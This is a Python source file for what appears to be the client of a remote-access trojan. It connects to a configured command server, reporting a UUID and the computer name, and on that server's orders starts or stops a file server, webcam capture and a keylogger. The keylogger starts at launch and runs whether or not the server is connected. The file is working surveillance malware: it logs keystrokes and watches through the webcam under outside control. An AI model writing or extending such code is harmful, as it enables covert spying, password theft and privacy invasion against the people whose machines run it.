from fileserver import file_server
from webcam import webcam
from keylogger import keylogger
from enums import Task
import config

from multiprocessing import Process, Queue
import time

import socketio


# Initialize global variables

sio = socketio.Client()

# Will be a dictionary when a process is created
# eg: 
# {
#    "process": process,
#    "queue": communicationQueue
# }
fileDirectoryProcess = None
webcamProcess = None
keystrokesProcess = None


@sio.event
def connect():
    print("Connected to server")


@sio.event
def disconnect():
    print("Disconnected from server")


@sio.on("File directory")
def file_directory(data):
    print("File directory", data)

    global fileDirectoryProcess

    if ((data["task"] == Task.START.value) and (fileDirectoryProcess is None)):                            # Check if the task is "Start" and if the process has not been created.     
        print("Starting file directory process")
        communicationQueue = Queue()                                                                       # Create a process communication queue.
        fileDirectoryProcess = {                                                                           # Dictionary with process and queue.
            "process": Process(target=file_server, args=(data, communicationQueue)),
            "queue": communicationQueue
        }
        fileDirectoryProcess["process"].start()                                                            # Start process
    elif ((data["task"] == Task.STOP.value) and (fileDirectoryProcess is not None) and (fileDirectoryProcess["process"].is_alive())):   # Check of the task is "Stop", if the process has been created and if the process is running.
        print("Stopping file directory process")
        fileDirectoryProcess["queue"].put(Task.STOP.value)                                                 # Signal the process to end the file server.
        fileDirectoryProcess["process"].join()                                                             # Wait for the process the end.
        fileDirectoryProcess = None


@sio.on("Web camera")
def webcam_capture(data):
    print("Web camera", data)

    global webcamProcess

    if ((data["task"] == Task.START.value) and (webcamProcess is None)):                            # Check if the task is "Start" and if the process has not been created.
        print("Starting web camera process")
        communicationQueue = Queue()                                                                # Create a process communication queue.
        webcamProcess = {                                                                           # Dictionary with process and queue.
            "process": Process(target=webcam, args=(data, communicationQueue)),
            "queue": communicationQueue
        }
        webcamProcess["process"].start()                                                            # Start process
    elif ((data["task"] == Task.STOP.value) and (webcamProcess is not None) and (webcamProcess["process"].is_alive())):     # Check of the task is "Stop", if the process has been created and if the process is running.
        print("Stopping web camera process")
        webcamProcess["queue"].put(Task.STOP.value)                                                 # Signal the process to end video streaming.
        webcamProcess["process"].join()                                                             # Wait for the process the end.
        webcamProcess = None         
    

@sio.on("Keystrokes")
def keystrokes(data):
    print("Keystrokes", data)

    global keystrokesProcess

    if ((data["task"] == Task.START.value) and (keystrokesProcess is None)):                            # Check if the task is "Start" and if the process has not been created.
        print("Starting keystrokes process")
        communicationQueue = Queue()                                                                    # Create a process communication queue.
        keystrokesProcess = {                                                                           # Dictionary with process and queue.
            "process": Process(target=keylogger, args=(communicationQueue,)),
            "queue": communicationQueue
        }
        keystrokesProcess["process"].start()                                                            # Start process
    elif ((data["task"] == Task.STOP.value) and (keystrokesProcess is not None) and (keystrokesProcess["process"].is_alive())):     # Check of the task is "Stop", if the process has been created and if the process is running.
        print("Stopping keystrokes process")
        keystrokesProcess["queue"].put(Task.STOP.value)                                                 # Signal the process to stop collecting keystrokes.
        keystrokesProcess["process"].join()                                                             # Wait for the process the end.
        keystrokesProcess = None         


if __name__ == "__main__":
    # File server function
    #file_server("C:\\")

    # Keylogger should always be running, regardless if the client is connected to the server.
    keystrokes({ "task": Task.START.value })

    sio.connect("http://{}:{}/?userType={}&uuid={}&computerName={}".format(config.SERVER, config.PORT, config.USER_TYPE, config.UUID, config.COMPUTER_NAME))
    print("SID is ", sio.sid)

    while True:
        time.sleep(60)